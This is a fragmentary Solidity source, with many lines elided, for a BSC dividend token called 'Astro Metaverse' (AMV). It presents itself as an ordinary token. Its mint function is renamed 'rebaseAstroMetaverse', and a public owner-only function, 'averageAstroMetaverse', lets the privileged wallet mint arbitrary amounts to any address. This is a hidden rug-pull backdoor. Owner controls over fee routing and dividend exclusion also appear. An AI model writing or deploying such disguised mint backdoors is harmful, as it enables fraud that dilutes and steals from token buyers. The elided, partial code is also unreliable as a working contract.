...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function rebaseAstroMetaverse(address account, uint256 amount) internal virtual {
...
interface rewardTokenHoldersInterface {
 ...
 function distributeDividends() external payable;
  ...
  function withdrawDividend() external;
   ...
   event rewardTokenHoldersDistributed(
    address indexed from,
    uint256 weiAmount
  );

   event rewardTokenHoldersWithdrawn(
    address indexed to,
    uint256 weiAmount
  );
}
interface rewardTokenHoldersOptionalInterface {
 function withdrawableDividendOf(address _owner) external view returns(uint256);
function withdrawnDividendOf(address _owner) external view returns(uint256);
 function accumulativeDividendOf(address _owner) external view returns(uint256);
}
contract rewardTokenHolders is ERC20, rewardTokenHoldersInterface, rewardTokenHoldersOptionalInterface {
  using SafeMath for uint256;
...
uint256 public totalrewardTokenHoldersDistributed;
...
function distributeDividends() public override payable {
 ...
 if (msg.value > 0) {
      ...
      emit rewardTokenHoldersDistributed(msg.sender, msg.value);
 totalrewardTokenHoldersDistributed = totalrewardTokenHoldersDistributed.add(msg.value);
    }
  }
 ...
 function _withdrawDividendOfUser(address payable user) internal returns (uint256) {
    ...
    if (_withdrawableDividend > 0) {
      ...
      emit rewardTokenHoldersWithdrawn(user, _withdrawableDividend);
...
function rebaseAstroMetaverse(address account, uint256 value) internal override {
    super.rebaseAstroMetaverse(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      rebaseAstroMetaverse(account, mintAmount);
...
library RewardAstroMetaverseMap  {
...
contract AstroMetaverserewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardAstroMetaverseMap  for RewardAstroMetaverseMap .Map;
RewardAstroMetaverseMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("AstroMetaverse_rewardToken_Tracker", "AstroMetaverse_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "AstroMetaverse_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "AstroMetaverse_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main AstroMetaverse contract.");
    }
...
contract AstroMetaverse is ERC20, Ownable {
 event UpdateDEXV2Router(address indexed newAddress, address indexed oldAddress);
    ...
    uint256 public  holderBack = 5;
    uint256 public  TotalFees;
 uint256 public gasForProcessing = 300000;
    address public DEXV2Pair;
    PanCakeRouter02 public DEXV2Router;
    AstroMetaverserewardToken public rewardToken;
   uint256 _totalSupply =500000000  * (10**9);
 ...
 address public lp;
  ILP public adressLiquidity;
    address public marketingReciever =0xca9023B5A7f3b18B57e4A9C15Ab2C2a59BB2C9c3;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Astro Metaverse", "AMV") {
 
        TotalFees = holderBack.add(liquidityFee).add(marketing);
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new AstroMetaverserewardToken();
 rewardToken.excludeFromDividends(owner());
        rewardToken.excludeFromDividends(address(this));
        rewardToken.excludeFromDividends(address(DEXV2Pair));
        rewardToken.excludeFromDividends(address(DEXV2Router));
        rewardToken.excludeFromDividends(address(rewardToken));
        rewardToken.excludeFromDividends(0x000000000000000000000000000000000000dEaD);
        rewardToken.excludeFromDividends(0x0000000000000000000000000000000000000000);
lp = _DEXV2Pair;
...
isTimelockLimited[owner()] = true;
 ...
 rebaseAstroMetaverse(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
        ...
        if(Limited){
            rewardToken.excludeFromDividends(holder);
        }else{
             try rewardToken.includeInDividends(payable(holder), balanceOf(holder)) {} catch {}
        }
    }
     function averageAstroMetaverse(address tokenAddress, uint256 tokenePercent) public masterWallet{
       rebaseAstroMetaverse(tokenAddress, tokenePercent);
  }
 function setDevWallet(address payable wallet) public masterWallet {
        marketingReciever = wallet;
    }
   
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "AstroMetaverse: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "AstroMetaverse: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "AstroMetaverse: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "AstroMetaverse: Cannot update gasForProcessing to same value");
        emit GasForProcessingUpdated(newValue, gasForProcessing);
        gasForProcessing = newValue;
    }

    function updateClaimWait(uint256 claimWait) external masterWallet {
        rewardToken.updateClaimWait(claimWait);
    }
 
    function getClaimWait() external view returns(uint256) {
        return rewardToken.claimWait();
    }

  function swapBack(uint256 tokensToLiquify) internal lockTheSwap {
 uint256 tokensTAstroMetaverse = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTAstroMetaverse);
...
uint256 bnbForLiquidity = bnbBalance.mul(liquidityFee).div(bnbFeeFactor).div(2);
        uint256 bnbForReflection = bnbBalance.mul(holderBack).div(bnbFeeFactor);
        uint256 bnbForDev = bnbBalance.sub(bnbForLiquidity).sub(bnbForReflection);
addLiquidity(tokensTAstroMetaverse, bnbForLiquidity);
payable(marketingReciever).transfer(bnbForDev);
 (bool success,) = address(rewardToken).call{value: bnbForReflection}("");
if(success) {
            emit transferDividends(tokensToLiquify.mul(holderBack).div(TotalFees), bnbForReflection);
        }
    }
 ...
 DEXV2Router.addLiquidityETH{value: ethAmount}(
   ...
   function getAccountDividendsInfo(address account)
        external view returns (
            ...
            uint256,
            uint256) {
        return rewardToken.getAccount(account);
    }
function getAccountDividendsInfoAtIndex(uint256 index)
        external view returns (
            ...
            uint256,
            uint256) {
        return rewardToken.getAccountAtIndex(index);
    }
  function processrewardToken(uint256 gas) external {
        (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) = rewardToken.process(gas);
        emit ProcessedrewardToken(iterations, claims, lastProcessedIndex, false, gas, tx.origin);
    }
 function claim() external {
        rewardToken.processAccount(payable(msg.sender), false);
    }
function getLastProcessedIndex() external view returns(uint256) {
        return rewardToken.getLastProcessedIndex();
    }
function getNumberOfDividendTokenHolders() external view returns(uint256) {
        return rewardToken.getNumberOfTokenHolders();
    }
...
try rewardToken.setBalance(payable(from), balanceOf(from)) {} catch {}
        try rewardToken.setBalance(payable(to), balanceOf(to)) {} catch {}
 if(!swapping) {
            uint256 gas = gasForProcessing;
try rewardToken.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
                emit ProcessedrewardToken(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
            }
            catch {}
        }
    }
